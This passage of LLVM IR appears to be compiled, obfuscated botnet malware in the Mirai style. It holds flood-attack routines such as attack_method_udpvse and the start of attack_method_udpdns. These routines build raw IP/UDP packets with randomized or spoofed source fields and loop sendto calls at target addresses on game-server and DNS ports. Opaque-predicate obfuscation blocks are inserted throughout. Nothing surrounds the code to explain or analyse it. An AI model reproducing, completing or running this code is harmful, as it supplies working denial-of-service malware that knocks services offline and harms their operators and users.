  %322 = trunc i32 %321 to i16
  %323 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %324 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %323, i32 0, i32 0
  store i16 %322, i16* %324, align 2
  br label %325

; <label>:325:                                    ; preds = %320, %316
  %326 = load i16, i16* %17, align 2
  %327 = zext i16 %326 to i32
  %328 = icmp eq i32 %327, 65535
  br i1 %328, label %329, label %334

; <label>:329:                                    ; preds = %325
  %330 = call i32 @rand_next()
  %331 = trunc i32 %330 to i16
  %332 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %333 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %332, i32 0, i32 1
  store i16 %331, i16* %333, align 2
  br label %334

; <label>:334:                                    ; preds = %329, %325
  %335 = load i8, i8* %19, align 1
  %336 = icmp ne i8 %335, 0
  br i1 %336, label %337, label %341

; <label>:337:                                    ; preds = %334
  %338 = load i8*, i8** %26, align 8
  %339 = load i16, i16* %18, align 2
  %340 = zext i16 %339 to i32
  call void @rand_str(i8* %338, i32 %340)
  br label %341

; <label>:341:                                    ; preds = %337, %334
  %342 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %343 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %342, i32 0, i32 7
  store i16 0, i16* %343, align 2
  %344 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %345 = bitcast %struct.iphdr* %344 to i16*
  %346 = call zeroext i16 @checksum_generic(i16* %345, i32 20)
  %347 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %348 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %347, i32 0, i32 7
  store i16 %346, i16* %348, align 2
  %349 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %350 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %349, i32 0, i32 3
  store i16 0, i16* %350, align 2
  %351 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %352 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %353 = bitcast %struct.udphdr* %352 to i8*
  %354 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %355 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %354, i32 0, i32 2
  %356 = load i16, i16* %355, align 2
  %357 = load i16, i16* %18, align 2
  %358 = zext i16 %357 to i64
  %359 = add i64 8, %358
  %360 = trunc i64 %359 to i32
  %361 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %351, i8* %353, i16 zeroext %356, i32 %360)
  %362 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %363 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %362, i32 0, i32 3
  store i16 %361, i16* %363, align 2
  %364 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %365 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %364, i32 0, i32 1
  %366 = load i16, i16* %365, align 2
  %367 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %368 = load i32, i32* %9, align 4
  %369 = sext i32 %368 to i64
  %370 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %367, i64 %369
  %371 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %370, i32 0, i32 0
  %372 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %371, i32 0, i32 1
  store i16 %366, i16* %372, align 2
  %373 = load i32, i32* %10, align 4
  %374 = load i8*, i8** %23, align 8
  %375 = load i16, i16* %18, align 2
  %376 = zext i16 %375 to i64
  %377 = add i64 28, %376
  %378 = bitcast %union.__CONST_SOCKADDR_ARG* %27 to %struct.sockaddr**
  %379 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %380 = load i32, i32* %9, align 4
  %381 = sext i32 %380 to i64
  %382 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %379, i64 %381
  %383 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %382, i32 0, i32 0
  %384 = bitcast %struct.sockaddr_in* %383 to %struct.sockaddr*
  store %struct.sockaddr* %384, %struct.sockaddr** %378, align 8
  %385 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %27, i32 0, i32 0
  %386 = load %struct.sockaddr*, %struct.sockaddr** %385, align 8
  %387 = call i64 @sendto(i32 %373, i8* %374, i64 %377, i32 16384, %struct.sockaddr* %386, i32 16)
  br label %388

; <label>:388:                                    ; preds = %341
  %389 = load i32, i32* %9, align 4
  %390 = add nsw i32 %389, 1
  store i32 %390, i32* %9, align 4
  br label %236

; <label>:391:                                    ; preds = %236
  br label %219

; <label>:392:                                    ; preds = %originalBBpart24, %91
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %72
  %393 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %393, i32* %10, align 4
  %394 = icmp eq i32 %393, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %97
  %395 = load i32, i32* %10, align 4
  %396 = call i32 @close(i32 %395)
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %166
  %397 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %398 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %399 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %398, i32 0, i32 4
  store i16 %397, i16* %399, align 2
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %219
  store i32 0, i32* %9, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %291
  %400 = load i16, i16* %13, align 2
  %401 = zext i16 %400 to i32
  %402 = icmp eq i32 %401, 65535
  br label %originalBB14
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpvse(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i8*, align 8
  %19 = alloca i32, align 4
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 8) #6
  %30 = bitcast i8* %29 to i8**
  store i8** %30, i8*** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 2, i32 0)
  %34 = trunc i32 %33 to i8
  store i8 %34, i8* %12, align 1
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 3, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 4, i32 64)
  %42 = trunc i32 %41 to i8
  store i8 %42, i8* %14, align 1
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 5, i32 0)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = load i8, i8* %7, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 6, i32 65535)
  %50 = trunc i32 %49 to i16
  store i16 %50, i16* %16, align 2
  %51 = load i8, i8* %7, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 7, i32 27015)
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %17, align 2
  call void @table_unlock_val(i8 zeroext 20)
  %55 = call i8* @table_retrieve_val(i32 20, i32* %19)
  store i8* %55, i8** %18, align 8
  %56 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %56, i32* %10, align 4
  %57 = icmp eq i32 %56, -1
  br i1 %57, label %58, label %75

; <label>:58:                                     ; preds = %4
  %59 = load i32, i32* @x.35
  %60 = load i32, i32* @y.36
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %58
  %67 = load i32, i32* @x.35
  %68 = load i32, i32* @y.36
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %336

; <label>:75:                                     ; preds = %4
  %76 = load i32, i32* @x.35
  %77 = load i32, i32* @y.36
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %75
  store i32 1, i32* %9, align 4
  %84 = load i32, i32* %10, align 4
  %85 = bitcast i32* %9 to i8*
  %86 = call i32 @setsockopt(i32 %84, i32 0, i32 3, i8* %85, i32 4) #6
  %87 = icmp eq i32 %86, -1
  %88 = load i32, i32* @x.35
  %89 = load i32, i32* @y.36
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %87, label %96, label %99

; <label>:96:                                     ; preds = %originalBBpart24
  %97 = load i32, i32* %10, align 4
  %98 = call i32 @close(i32 %97)
  br label %336

; <label>:99:                                     ; preds = %originalBBpart24
  store i32 0, i32* %9, align 4
  br label %100

; <label>:100:                                    ; preds = %192, %99
  %101 = load i32, i32* %9, align 4
  %102 = load i8, i8* %5, align 1
  %103 = zext i8 %102 to i32
  %104 = icmp slt i32 %101, %103
  br i1 %104, label %105, label %195

; <label>:105:                                    ; preds = %100
  %106 = call noalias i8* @calloc(i64 128, i64 1) #6
  %107 = load i8**, i8*** %11, align 8
  %108 = load i32, i32* %9, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8*, i8** %107, i64 %109
  store i8* %106, i8** %110, align 8
  %111 = load i8**, i8*** %11, align 8
  %112 = load i32, i32* %9, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds i8*, i8** %111, i64 %113
  %115 = load i8*, i8** %114, align 8
  %116 = bitcast i8* %115 to %struct.iphdr*
  store %struct.iphdr* %116, %struct.iphdr** %20, align 8
  %117 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %118 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %117, i64 1
  %119 = bitcast %struct.iphdr* %118 to %struct.udphdr*
  store %struct.udphdr* %119, %struct.udphdr** %21, align 8
  %120 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %121 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %120, i64 1
  %122 = bitcast %struct.udphdr* %121 to i8*
  store i8* %122, i8** %22, align 8
  %123 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %124 = bitcast %struct.iphdr* %123 to i8*
  %125 = load i8, i8* %124, align 4
  %126 = and i8 %125, 15
  %127 = or i8 %126, 64
  store i8 %127, i8* %124, align 4
  %128 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %129 = bitcast %struct.iphdr* %128 to i8*
  %130 = load i8, i8* %129, align 4
  %131 = and i8 %130, -16
  %132 = or i8 %131, 5
  store i8 %132, i8* %129, align 4
  %133 = load i8, i8* %12, align 1
  %134 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %135 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %134, i32 0, i32 1
  store i8 %133, i8* %135, align 1
  %136 = load i32, i32* %19, align 4
  %137 = sext i32 %136 to i64
  %138 = add i64 32, %137
  %139 = trunc i64 %138 to i16
  %140 = call zeroext i16 @htons(i16 zeroext %139) #7
  %141 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %142 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %141, i32 0, i32 2
  store i16 %140, i16* %142, align 2
  %143 = load i16, i16* %13, align 2
  %144 = call zeroext i16 @htons(i16 zeroext %143) #7
  %145 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i32 0, i32 3
  store i16 %144, i16* %146, align 4
  %147 = load i8, i8* %14, align 1
  %148 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %149 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %148, i32 0, i32 5
  store i8 %147, i8* %149, align 4
  %150 = load i8, i8* %15, align 1
  %151 = icmp ne i8 %150, 0
  br i1 %151, label %152, label %156

; <label>:152:                                    ; preds = %105
  %153 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %154 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %155 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %154, i32 0, i32 4
  store i16 %153, i16* %155, align 2
  br label %156

; <label>:156:                                    ; preds = %152, %105
  %157 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %158 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %157, i32 0, i32 6
  store i8 17, i8* %158, align 1
  %159 = load i32, i32* @LOCAL_ADDR, align 4
  %160 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %161 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %160, i32 0, i32 8
  store i32 %159, i32* %161, align 4
  %162 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %163 = load i32, i32* %9, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %162, i64 %164
  %166 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %165, i32 0, i32 1
  %167 = load i32, i32* %166, align 4
  %168 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 9
  store i32 %167, i32* %169, align 4
  %170 = load i16, i16* %16, align 2
  %171 = call zeroext i16 @htons(i16 zeroext %170) #7
  %172 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %173 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %172, i32 0, i32 0
  store i16 %171, i16* %173, align 2
  %174 = load i16, i16* %17, align 2
  %175 = call zeroext i16 @htons(i16 zeroext %174) #7
  %176 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %177 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %176, i32 0, i32 1
  store i16 %175, i16* %177, align 2
  %178 = load i32, i32* %19, align 4
  %179 = sext i32 %178 to i64
  %180 = add i64 12, %179
  %181 = trunc i64 %180 to i16
  %182 = call zeroext i16 @htons(i16 zeroext %181) #7
  %183 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %184 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %183, i32 0, i32 2
  store i16 %182, i16* %184, align 2
  %185 = load i8*, i8** %22, align 8
  %186 = bitcast i8* %185 to i32*
  store i32 -1, i32* %186, align 4
  %187 = load i8*, i8** %22, align 8
  %188 = getelementptr inbounds i8, i8* %187, i64 4
  store i8* %188, i8** %22, align 8
  %189 = load i8*, i8** %22, align 8
  %190 = load i8*, i8** %18, align 8
  %191 = load i32, i32* %19, align 4
  call void @util_memcpy(i8* %189, i8* %190, i32 %191)
  br label %192

; <label>:192:                                    ; preds = %156
  %193 = load i32, i32* %9, align 4
  %194 = add nsw i32 %193, 1
  store i32 %194, i32* %9, align 4
  br label %100

; <label>:195:                                    ; preds = %100
  br label %196

; <label>:196:                                    ; preds = %335, %195
  store i32 0, i32* %9, align 4
  br label %197

; <label>:197:                                    ; preds = %332, %196
  %198 = load i32, i32* %9, align 4
  %199 = load i8, i8* %5, align 1
  %200 = zext i8 %199 to i32
  %201 = icmp slt i32 %198, %200
  br i1 %201, label %202, label %335

; <label>:202:                                    ; preds = %197
  %203 = load i8**, i8*** %11, align 8
  %204 = load i32, i32* %9, align 4
  %205 = sext i32 %204 to i64
  %206 = getelementptr inbounds i8*, i8** %203, i64 %205
  %207 = load i8*, i8** %206, align 8
  store i8* %207, i8** %23, align 8
  %208 = load i8*, i8** %23, align 8
  %209 = bitcast i8* %208 to %struct.iphdr*
  store %struct.iphdr* %209, %struct.iphdr** %24, align 8
  %210 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %211 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %210, i64 1
  %212 = bitcast %struct.iphdr* %211 to %struct.udphdr*
  store %struct.udphdr* %212, %struct.udphdr** %25, align 8
  %213 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %214 = load i32, i32* %9, align 4
  %215 = sext i32 %214 to i64
  %216 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %213, i64 %215
  %217 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %216, i32 0, i32 2
  %218 = load i8, i8* %217, align 4
  %219 = zext i8 %218 to i32
  %220 = icmp slt i32 %219, 32
  br i1 %220, label %221, label %242

; <label>:221:                                    ; preds = %202
  %222 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %223 = load i32, i32* %9, align 4
  %224 = sext i32 %223 to i64
  %225 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %222, i64 %224
  %226 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %225, i32 0, i32 1
  %227 = load i32, i32* %226, align 4
  %228 = call i32 @ntohl(i32 %227) #7
  %229 = call i32 @rand_next()
  %230 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %231 = load i32, i32* %9, align 4
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %230, i64 %232
  %234 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %233, i32 0, i32 2
  %235 = load i8, i8* %234, align 4
  %236 = zext i8 %235 to i32
  %237 = lshr i32 %229, %236
  %238 = add i32 %228, %237
  %239 = call i32 @htonl(i32 %238) #7
  %240 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %241 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %240, i32 0, i32 9
  store i32 %239, i32* %241, align 4
  br label %242

; <label>:242:                                    ; preds = %221, %202
  %243 = load i16, i16* %13, align 2
  %244 = zext i16 %243 to i32
  %245 = icmp eq i32 %244, 65535
  br i1 %245, label %246, label %251

; <label>:246:                                    ; preds = %242
  %247 = call i32 @rand_next()
  %248 = trunc i32 %247 to i16
  %249 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %250 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %249, i32 0, i32 3
  store i16 %248, i16* %250, align 4
  br label %251

; <label>:251:                                    ; preds = %246, %242
  %252 = load i32, i32* @x.35
  %253 = load i32, i32* @y.36
  %254 = sub i32 %252, 1
  %255 = mul i32 %252, %254
  %256 = urem i32 %255, 2
  %257 = icmp eq i32 %256, 0
  %258 = icmp slt i32 %253, 10
  %259 = or i1 %257, %258
  br i1 %259, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %251
  %260 = load i16, i16* %16, align 2
  %261 = zext i16 %260 to i32
  %262 = icmp eq i32 %261, 65535
  %263 = load i32, i32* @x.35
  %264 = load i32, i32* @y.36
  %265 = sub i32 %263, 1
  %266 = mul i32 %263, %265
  %267 = urem i32 %266, 2
  %268 = icmp eq i32 %267, 0
  %269 = icmp slt i32 %264, 10
  %270 = or i1 %268, %269
  br i1 %270, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %262, label %271, label %276

; <label>:271:                                    ; preds = %originalBBpart28
  %272 = call i32 @rand_next()
  %273 = trunc i32 %272 to i16
  %274 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %275 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %274, i32 0, i32 0
  store i16 %273, i16* %275, align 2
  br label %276

; <label>:276:                                    ; preds = %271, %originalBBpart28
  %277 = load i16, i16* %17, align 2
  %278 = zext i16 %277 to i32
  %279 = icmp eq i32 %278, 65535
  br i1 %279, label %280, label %285

; <label>:280:                                    ; preds = %276
  %281 = call i32 @rand_next()
  %282 = trunc i32 %281 to i16
  %283 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %284 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %283, i32 0, i32 1
  store i16 %282, i16* %284, align 2
  br label %285

; <label>:285:                                    ; preds = %280, %276
  %286 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %287 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %286, i32 0, i32 7
  store i16 0, i16* %287, align 2
  %288 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %289 = bitcast %struct.iphdr* %288 to i16*
  %290 = call zeroext i16 @checksum_generic(i16* %289, i32 20)
  %291 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %292 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %291, i32 0, i32 7
  store i16 %290, i16* %292, align 2
  %293 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %294 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %293, i32 0, i32 3
  store i16 0, i16* %294, align 2
  %295 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %296 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %297 = bitcast %struct.udphdr* %296 to i8*
  %298 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %299 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %298, i32 0, i32 2
  %300 = load i16, i16* %299, align 2
  %301 = load i32, i32* %19, align 4
  %302 = sext i32 %301 to i64
  %303 = add i64 12, %302
  %304 = trunc i64 %303 to i32
  %305 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %295, i8* %297, i16 zeroext %300, i32 %304)
  %306 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %307 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %306, i32 0, i32 3
  store i16 %305, i16* %307, align 2
  %308 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %309 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %308, i32 0, i32 1
  %310 = load i16, i16* %309, align 2
  %311 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %312 = load i32, i32* %9, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %311, i64 %313
  %315 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %314, i32 0, i32 0
  %316 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %315, i32 0, i32 1
  store i16 %310, i16* %316, align 2
  %317 = load i32, i32* %10, align 4
  %318 = load i8*, i8** %23, align 8
  %319 = load i32, i32* %19, align 4
  %320 = sext i32 %319 to i64
  %321 = add i64 32, %320
  %322 = bitcast %union.__CONST_SOCKADDR_ARG* %26 to %struct.sockaddr**
  %323 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %324 = load i32, i32* %9, align 4
  %325 = sext i32 %324 to i64
  %326 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %323, i64 %325
  %327 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %326, i32 0, i32 0
  %328 = bitcast %struct.sockaddr_in* %327 to %struct.sockaddr*
  store %struct.sockaddr* %328, %struct.sockaddr** %322, align 8
  %329 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %26, i32 0, i32 0
  %330 = load %struct.sockaddr*, %struct.sockaddr** %329, align 8
  %331 = call i64 @sendto(i32 %317, i8* %318, i64 %321, i32 16384, %struct.sockaddr* %330, i32 16)
  br label %332

; <label>:332:                                    ; preds = %285
  %333 = load i32, i32* %9, align 4
  %334 = add nsw i32 %333, 1
  store i32 %334, i32* %9, align 4
  br label %197

; <label>:335:                                    ; preds = %197
  br label %196

; <label>:336:                                    ; preds = %96, %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %58
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %75
  store i32 1, i32* %9, align 4
  %337 = load i32, i32* %10, align 4
  %338 = bitcast i32* %9 to i8*
  %339 = call i32 @setsockopt(i32 %337, i32 0, i32 3, i8* %338, i32 4) #6
  %340 = icmp eq i32 %339, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %251
  %341 = load i16, i16* %16, align 2
  %342 = zext i16 %341 to i32
  %343 = icmp eq i32 %342, 65535
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpdns(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = load i32, i32* @x.37
  %6 = load i32, i32* @y.38
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i8, align 1
  %14 = alloca %struct.attack_target*, align 8
  %15 = alloca i8, align 1
  %16 = alloca %struct.attack_option*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8**, align 8
  %20 = alloca i8, align 1
  %21 = alloca i16, align 2
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i16, align 2
  %25 = alloca i16, align 2
  %26 = alloca i16, align 2
  %27 = alloca i8, align 1
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i8, align 1
  %33 = alloca i8, align 1
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.udphdr*, align 8
  %36 = alloca %struct.dnshdr*, align 8
  %37 = alloca i8*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca %struct.grehdr*, align 8
  %40 = alloca i8*, align 8
  %41 = alloca %struct.iphdr*, align 8
  %42 = alloca %struct.udphdr*, align 8
  %43 = alloca %struct.dnshdr*, align 8
  %44 = alloca i8*, align 8
  %45 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %13, align 1
  store %struct.attack_target* %1, %struct.attack_target** %14, align 8
  store i8 %2, i8* %15, align 1
  store %struct.attack_option* %3, %struct.attack_option** %16, align 8
  %46 = load i8, i8* %13, align 1
  %47 = zext i8 %46 to i64
  %48 = call noalias i8* @calloc(i64 %47, i64 8) #6
  %49 = bitcast i8* %48 to i8**
  store i8** %49, i8*** %19, align 8
  %50 = load i8, i8* %15, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 2, i32 0)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %20, align 1
  %54 = load i8, i8* %15, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 3, i32 65535)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %21, align 2
  %58 = load i8, i8* %15, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 4, i32 64)
  %61 = trunc i32 %60 to i8
  store i8 %61, i8* %22, align 1
  %62 = load i8, i8* %15, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 5, i32 0)
  %65 = trunc i32 %64 to i8
  store i8 %65, i8* %23, align 1
  %66 = load i8, i8* %15, align 1
  %67 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %68 = call i32 @attack_get_opt_int(i8 zeroext %66, %struct.attack_option* %67, i8 zeroext 6, i32 65535)
  %69 = trunc i32 %68 to i16
  store i16 %69, i16* %24, align 2
  %70 = load i8, i8* %15, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %72 = call i32 @attack_get_opt_int(i8 zeroext %70, %struct.attack_option* %71, i8 zeroext 7, i32 53)
  %73 = trunc i32 %72 to i16
  store i16 %73, i16* %25, align 2
